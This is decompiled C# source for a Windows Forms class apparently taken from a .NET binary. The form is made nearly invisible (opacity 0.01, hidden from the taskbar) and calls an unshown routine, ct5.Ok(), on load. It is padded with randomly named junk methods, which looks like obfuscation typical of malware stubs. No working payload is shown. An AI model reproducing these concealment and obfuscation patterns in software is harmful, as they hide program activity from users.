using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace ulti;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("ComboBox1")]
	private ComboBox _ComboBox1;

	[AccessedThroughProperty("CheckedListBox1")]
	private CheckedListBox _CheckedListBox1;

	[AccessedThroughProperty("CheckBox1")]
	private CheckBox _CheckBox1;

	[AccessedThroughProperty("CheckBox2")]
	private CheckBox _CheckBox2;

	[AccessedThroughProperty("CheckBox3")]
	private CheckBox _CheckBox3;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("Button2")]
	private Button _Button2;

	[AccessedThroughProperty("Button3")]
	private Button _Button3;

	[AccessedThroughProperty("ProgressBar1")]
	private ProgressBar _ProgressBar1;

	[AccessedThroughProperty("ProgressBar2")]
	private ProgressBar _ProgressBar2;

	internal virtual ComboBox ComboBox1
	{
		get
		{
			return _ComboBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ComboBox1 = value;
		}
	}

	internal virtual CheckedListBox CheckedListBox1
	{
		get
		{
			return _CheckedListBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_CheckedListBox1 = value;
		}
	}

	internal virtual CheckBox CheckBox1
	{
		get
		{
			return _CheckBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_CheckBox1 = value;
		}
	}

	internal virtual CheckBox CheckBox2
	{
		get
		{
			return _CheckBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_CheckBox2 = value;
		}
	}

	internal virtual CheckBox CheckBox3
	{
		get
		{
			return _CheckBox3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_CheckBox3 = value;
		}
	}

	internal virtual Button Button1
	{
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Button1 = value;
		}
	}

	internal virtual Button Button2
	{
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Button2 = value;
		}
	}

	internal virtual Button Button3
	{
		get
		{
			return _Button3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Button3_Click;
			if (_Button3 != null)
			{
				((Control)_Button3).remove_Click(eventHandler);
			}
			_Button3 = value;
			if (_Button3 != null)
			{
				((Control)_Button3).add_Click(eventHandler);
			}
		}
	}

	internal virtual ProgressBar ProgressBar1
	{
		get
		{
			return _ProgressBar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ProgressBar1 = value;
		}
	}

	internal virtual ProgressBar ProgressBar2
	{
		get
		{
			return _ProgressBar2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ProgressBar2 = value;
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		ComboBox1 = new ComboBox();
		CheckedListBox1 = new CheckedListBox();
		CheckBox1 = new CheckBox();
		CheckBox2 = new CheckBox();
		CheckBox3 = new CheckBox();
		Button1 = new Button();
		Button2 = new Button();
		Button3 = new Button();
		ProgressBar1 = new ProgressBar();
		ProgressBar2 = new ProgressBar();
		((Control)this).SuspendLayout();
		((ListControl)ComboBox1).set_FormattingEnabled(true);
		ComboBox comboBox = ComboBox1;
		Point location = new Point(97, 58);
		((Control)comboBox).set_Location(location);
		((Control)ComboBox1).set_Name("ComboBox1");
		ComboBox comboBox2 = ComboBox1;
		Size size = new Size(108, 21);
		((Control)comboBox2).set_Size(size);
		((Control)ComboBox1).set_TabIndex(0);
		((ListControl)CheckedListBox1).set_FormattingEnabled(true);
		CheckedListBox checkedListBox = CheckedListBox1;
		location = new Point(47, 129);
		((Control)checkedListBox).set_Location(location);
		((Control)CheckedListBox1).set_Name("CheckedListBox1");
		CheckedListBox checkedListBox2 = CheckedListBox1;
		size = new Size(95, 49);
		((Control)checkedListBox2).set_Size(size);
		((Control)CheckedListBox1).set_TabIndex(1);
		((ButtonBase)CheckBox1).set_AutoSize(true);
		CheckBox checkBox = CheckBox1;
		location = new Point(253, 110);
		((Control)checkBox).set_Location(location);
		((Control)CheckBox1).set_Name("CheckBox1");
		CheckBox checkBox2 = CheckBox1;
		size = new Size(81, 17);
		((Control)checkBox2).set_Size(size);
		((Control)CheckBox1).set_TabIndex(2);
		((ButtonBase)CheckBox1).set_Text("CheckBox1");
		((ButtonBase)CheckBox1).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox2).set_AutoSize(true);
		CheckBox checkBox3 = CheckBox2;
		location = new Point(301, 152);
		((Control)checkBox3).set_Location(location);
		((Control)CheckBox2).set_Name("CheckBox2");
		CheckBox checkBox4 = CheckBox2;
		size = new Size(81, 17);
		((Control)checkBox4).set_Size(size);
		((Control)CheckBox2).set_TabIndex(3);
		((ButtonBase)CheckBox2).set_Text("CheckBox2");
		((ButtonBase)CheckBox2).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox3).set_AutoSize(true);
		CheckBox checkBox5 = CheckBox3;
		location = new Point(344, 193);
		((Control)checkBox5).set_Location(location);
		((Control)CheckBox3).set_Name("CheckBox3");
		CheckBox checkBox6 = CheckBox3;
		size = new Size(81, 17);
		((Control)checkBox6).set_Size(size);
		((Control)CheckBox3).set_TabIndex(4);
		((ButtonBase)CheckBox3).set_Text("CheckBox3");
		((ButtonBase)CheckBox3).set_UseVisualStyleBackColor(true);
		Button button = Button1;
		location = new Point(177, 238);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		size = new Size(114, 31);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(5);
		((ButtonBase)Button1).set_Text("rd");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		Button button3 = Button2;
		location = new Point(200, 287);
		((Control)button3).set_Location(location);
		((Control)Button2).set_Name("Button2");
		Button button4 = Button2;
		size = new Size(133, 28);
		((Control)button4).set_Size(size);
		((Control)Button2).set_TabIndex(6);
		((ButtonBase)Button2).set_Text("pk");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(true);
		Button button5 = Button3;
		location = new Point(205, 191);
		((Control)button5).set_Location(location);
		((Control)Button3).set_Name("Button3");
		Button button6 = Button3;
		size = new Size(128, 31);
		((Control)button6).set_Size(size);
		((Control)Button3).set_TabIndex(7);
		((ButtonBase)Button3).set_Text("kh");
		((ButtonBase)Button3).set_UseVisualStyleBackColor(true);
		ProgressBar progressBar = ProgressBar1;
		location = new Point(25, 205);
		((Control)progressBar).set_Location(location);
		((Control)ProgressBar1).set_Name("ProgressBar1");
		ProgressBar progressBar2 = ProgressBar1;
		size = new Size(162, 16);
		((Control)progressBar2).set_Size(size);
		((Control)ProgressBar1).set_TabIndex(8);
		ProgressBar progressBar3 = ProgressBar2;
		location = new Point(38, 233);
		((Control)progressBar3).set_Location(location);
		((Control)ProgressBar2).set_Name("ProgressBar2");
		ProgressBar progressBar4 = ProgressBar2;
		size = new Size(127, 16);
		((Control)progressBar4).set_Size(size);
		((Control)ProgressBar2).set_TabIndex(9);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(124, 4);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar2);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar1);
		((Control)this).get_Controls().Add((Control)(object)Button3);
		((Control)this).get_Controls().Add((Control)(object)Button2);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)CheckBox3);
		((Control)this).get_Controls().Add((Control)(object)CheckBox2);
		((Control)this).get_Controls().Add((Control)(object)CheckBox1);
		((Control)this).get_Controls().Add((Control)(object)CheckedListBox1);
		((Control)this).get_Controls().Add((Control)(object)ComboBox1);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.01);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("F");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	public void Gr_WIytn1SqT978Hsd()
	{
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		new decimal(-512129637L);
		try
		{
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		while (true)
		{
		}
	}

	private void Button3_Click(object sender, EventArgs e)
	{
	}

	public void Gr_MDo2z3XjIGu4y5DSVi()
	{
		new decimal(95247160L);
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			new decimal(-1221433984L);
			ProjectData.ClearProjectError();
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		ct5.Ok();
	}

	public void Gr_EN981Bp5y()
	{
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		for (double num = 0.6181005; !(num > 0.3066294); num += 1.0)
		{
			new decimal(-1186419551L);
			try
			{
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}
}
